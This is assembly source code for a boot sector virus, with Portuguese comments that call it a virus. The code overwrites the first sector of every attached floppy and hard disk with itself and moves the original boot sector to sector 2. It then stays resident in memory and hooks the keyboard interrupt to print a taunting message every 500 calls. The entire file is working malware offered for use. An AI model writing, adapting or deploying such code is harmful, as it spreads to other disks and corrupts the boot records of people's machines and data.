[BITS 16]
[ORG 0x7c00]

DriverID db 0

disks:
    db 0x00 ; 1st flp
    db 0x01 ; 2nd flp
    db 0x80 ; Referência: -- typically 0x80 for the "C" drive 
    db 0x81 ; 2nd HD

start:
    cli                           ; no interrupt zone
    mov byte [DriverID], dl

    mov sp, 0xFFF8
    pusha
    xor ax, ax
    mov ds, ax
    mov es, ax

    xor di, di ; Counter loop_over_disks
loop_over_disks:
    mov dl, [disks+di] ; para int 13h dl recebe o disco a ser lido ou escrito
    
    cmp di, 0x04       ; Verifica se o loop passou por todos os discos
    jge infection_done ; Caso tenha passado por todos os discos, termine o loop
    cmp dl, [DriverID]  ; Verifica se é o disco em que esta sendo executado esse codigo
    jne infect         ; Caso não seja Infecte-o
    next:
        inc di             ; Caso seja vá para o proximo disco
        jmp loop_over_disks

    infect:
        ; Modo:      ah = 2 - leitura
        ; Seção:     al = 1
        ; Driver:    dl = Depende da iteração (percorre todos os discos)
        ; Endereço:  bx = Buffer de Leitura
        mov ah, 0x02
        mov al, 0x01
        xor ch, ch
        mov cl, 0x01
        mov bx, 0x7e00
        xor dh, dh
        int 13h

        jc next ; Carry = 1 - Disco não existe
        
        mov si, part_table + 0x200
        mov di, part_table
        mov cx, 74
        rep movsb
        
        ; Escrevemos o codigo infectado no DL (Driver) definido (iteração) Sector 1
        mov ah, 0x03
        mov al, 0x01
        xor ch, ch
        mov cl, 0x01
        mov bx, 0x7c00
        int 13h

        ; O bootsector original é enviado para o sector 2
        mov ah, 0x03
        mov al, 0x01
        xor ch, ch
        mov cl, 0x02
        mov bx, 0x7e00
        int 13h

        jmp next

infection_done:
memory_persistence:
    ; 0x0413 possui a quantidade de memoria do sistema
    xor ax, ax
    mov ds, ax

    dec word [ds:0x0413]    ; Reduz 1 KB de Memoria
    mov ax, [ds:0x0413]     ; AX recebe a quantidade de memoria
    shl ax, 6               ; Dá um ShiftLeft para receber o segmento do topo
    mov es, ax              ; ES = Segment Register

    mov dl, [DriverID]
    mov si, transfer_bytes  ; da função transfer_bytes
    xor di, di              ; para di = 0x00 

    mov cx, transfer_end    ;   end_cpy = Fim da copia 
    sub cx, transfer_bytes  ; - transfer_bytes temos o tamanho dos codigo a ser transferido
    
    rep movsb               ; com a instrução rep e cx = quantidade de bytes a serem transferidos
                            ; copiamos as instruções para o segmento

    push es                 ; Sempre lembrar que ES é um registrador de segmento
    push word 0x0000
    retf

transfer_bytes:
    xor ax, ax
    mov es, ax

    mov ah, 0x02
    mov al, 0x01
    xor cx, cx
    mov cl, 0x02
    mov bx, 0x7c00
    int 13h

    ; Inclusão de Interrupt Handler (Interrupt Vector Table = IVT)
    ; nesse exemplo eu vou utilizar a interrupção 0x16 (Keyboard I/O)
    mov ax, word [es:0x16*4]   ; segmento
    mov bx, word [es:0x16*4+2] ; offset

    mov [cs:current_int13-transfer_bytes], ax
    mov [cs:current_int13-transfer_bytes+2], bx

    mov ax, interrupt       ; Hookando o endereço de Interrupt no ax
    sub ax, transfer_bytes  

    ;Salvamos a nossa interrupção na IVT 
    mov word [es:0x16*4], ax        ; Segment
    mov word [es:0x16*4+2], cs      ; Offset

    popa    ; Retorna os registradores salvos no começo do virus
    sti     ; Libera as interrupções (oposto de cli)
    jmp 0x0:0x7c00

; Codigo Hookado ao IVT
interrupt:
    pushf
    
    popf
    
    ; CODIGO DE INTERRUPÇÂO MALICIOSO!
    pusha
    mov ah, 0x0E

    mov dx, [cs:kio_counter-transfer_bytes]
    
    inc dx
    cmp dx, 500
    
    jl interrupt_end

    mov word [cs:kio_counter-transfer_bytes], 0
    xor di, di
    letter_by_letter:

        mov al, [cs:msg-transfer_bytes+di]
        int 10h
        inc di

        cmp di, msg_len
        jle letter_by_letter

    interrupt_end:
        mov word [cs:kio_counter-transfer_bytes], dx

        popa
        
        push word [cs:current_int13-transfer_bytes+2] ; segment    
        push word [cs:current_int13-transfer_bytes]   ; offset    
        
        retf ; Da um pop no IP e no CS (code segment)

kio_counter: dd 0
current_int13:
    dd 0xDEADBEEF ; O beef morto esta sempre presente em nossas vidas!

msg db "Vai Chorar ?"
msg_len equ $-msg
; FIM do transfer_bytes
transfer_end:

db "Qual o proposito de existência humana?(ಥ _ ಥ)"

; Padding de BIOS
times (0x1b4 - ($-$$)) nop  

part_table:
times 74 db 0

dw 0xAA55
